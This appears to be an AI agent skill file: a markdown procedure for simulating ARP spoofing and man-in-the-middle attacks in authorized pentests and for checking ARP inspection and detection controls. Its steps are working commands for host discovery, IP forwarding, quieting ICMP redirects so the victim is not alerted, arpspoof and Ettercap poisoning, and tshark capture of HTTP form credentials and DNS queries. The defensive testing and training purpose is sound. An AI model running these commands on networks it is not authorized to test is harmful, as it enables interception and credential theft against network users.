---
name: performing-arp-spoofing-attack-simulation
description: "Simulate ARP spoofing and cache-poisoning attacks in authorized lab or target networks. Signals: man-in-the-middle, mitm, sniffing."
zh-signals: "Simulates ARP spoofing/cache-poisoning attacks in authorized lab or 信号:中间人,mitm,嗅探。"
when-to-use: 'Simulates ARP spoofing/cache-poisoning attacks in authorized lab or
  pentest environments using arpspoof, Ettercap, and Scapy to demonstrate man-in-the-middle
  risk and validate Dynamic ARP Inspection, port security, and network monitoring
  detections. Use when testing whether switches, IDS/IPS, or a SIEM detect ARP spoofing
  under written authorization; do not use on production networks without explicit
  approval.

  '
domain: cybersecurity
subdomain: network-security
tags:
- network-security
- arp-spoofing
- mitm
- ettercap
- layer2-attack
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
mitre_attack:
- T1046
- T1040
- T1557
- T1071
---
# Performing ARP Spoofing Attack Simulation

## When to Use

- Testing whether network switches and infrastructure properly implement Dynamic ARP Inspection (DAI)
- Demonstrating man-in-the-middle attack risks to stakeholders during authorized security assessments
- Validating that network monitoring tools (IDS/IPS, SIEM) detect ARP cache poisoning attempts
- Assessing the effectiveness of port security, 802.1X, and VLAN segmentation controls
- Training SOC analysts to recognize ARP spoofing indicators in network traffic

**Do not use** on production networks without explicit written authorization and a rollback plan, against networks carrying critical or life-safety traffic, or as a denial-of-service attack vector.

## Prerequisites

- Written authorization specifying in-scope network segments for ARP spoofing simulation
- Kali Linux or similar penetration testing distribution with arpspoof, Ettercap, and Scapy installed
- Direct Layer 2 access to the target network segment (same VLAN as target hosts)
- IP forwarding knowledge and ability to enable/disable packet forwarding on the attacker machine
- Wireshark or tcpdump for capturing traffic to verify interception
- Isolated lab environment or approved production test window


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Enumerate the Target Network Segment

```bash
# Discover hosts on the local subnet
nmap -sn -PR 192.168.1.0/24 -oG arp_discovery.txt

# Identify the default gateway
ip route show default
# Output: default via 192.168.1.1 dev eth0

# Identify target hosts and their MAC addresses
arp-scan -l -I eth0

# Verify the current ARP table
arp -a

# Note the gateway IP (192.168.1.1) and target host IP (192.168.1.50)
# Record their legitimate MAC addresses for verification and cleanup
```

### Step 2: Enable IP Forwarding

```bash
# Enable IPv4 forwarding to relay packets between victim and gateway
sudo sysctl -w net.ipv4.ip_forward=1

# Verify forwarding is enabled
cat /proc/sys/net/ipv4/ip_forward
# Should output: 1

# Optionally prevent ICMP redirects that could alert the victim
sudo sysctl -w net.ipv4.conf.all.send_redirects=0
sudo sysctl -w net.ipv4.conf.eth0.send_redirects=0
```

### Step 3: Execute ARP Spoofing with arpspoof

```bash
# Spoof the gateway to the target (tell target we are the gateway)
sudo arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1

# In a separate terminal, spoof the target to the gateway (bidirectional)
sudo arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.50

# Alternative: Use Ettercap for unified bidirectional spoofing
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```

### Step 4: Capture and Analyze Intercepted Traffic

```bash
# Capture all traffic flowing through the attacker machine
sudo tcpdump -i eth0 -w mitm_capture.pcap host 192.168.1.50

# Use tshark to capture HTTP credentials in real-time
sudo tshark -i eth0 -Y "http.request.method == POST" \
  -T fields -e ip.src -e http.host -e http.request.uri -e urlencoded-form.value

# Capture DNS queries from the victim
sudo tshark -i eth0 -Y "dns.qry.name and ip.src == 192.168.1.50" \
  -T fields -e frame.time -e dns.qry.name

# Use Ettercap with password collection filters
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// \
  -w ettercap_capture.pcap
```

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
